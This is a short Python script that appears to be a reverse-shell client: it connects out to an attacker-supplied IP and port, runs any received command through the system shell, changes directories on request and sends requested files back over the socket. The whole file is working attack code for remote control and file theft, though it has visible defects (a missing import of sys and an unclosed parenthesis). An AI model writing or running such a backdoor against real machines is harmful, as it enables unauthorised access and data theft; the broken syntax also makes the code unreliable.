import socket 
import subprocess
import os


print("Using the script\n")
print(">cd C:/user/\n")
print(">grab file.txt\n")
print(">terminate\n")

def transfer(s,path):
    if os.path.exists(path):
        f=open(path,'rb')
        packet=f.read(1024)
        while len(packet)>0:
            s.send(packet)
            packet=f.read(1024)
        s.send('DONE'.encode())
    else:
        s.send('File not found'.encode())
        
def connect(ip,port):
    s=socket.socket()
    s.connect((str(ip),int(port))
    while True:
        command=s.recv(1024)
        if 'terminate'  in command.decode():
            s.close()
            break
        elif 'grab' in command.decode():
            grab,path=command.decode().split(" ")
            try:
                transfer(s,path)
            except:
                print("Error in passing file")
        elif 'cd' in command.decode():
            code,directory=command.decode().split(" ")
            try:
                os.chdir(directory)
                s.send("[+]changed".encode())
            except Exception as e:
                s.send(("[-]"+str(e)).encode())
                
        else:
            cmd=subprocess.Popen(command.decode(),shell=True,stdout=subprocess.PIPE,stderr=subprocess.PIPE,stdin=subprocess.PIPE)
            s.send(cmd.stdout.read())
            s.send(cmd.stderr.read())
        
def main():
    print("usage ./server.py <target ip addr> <port>\n")
    connect(sys.argv[1],sys.argv[2])
    
main()
            
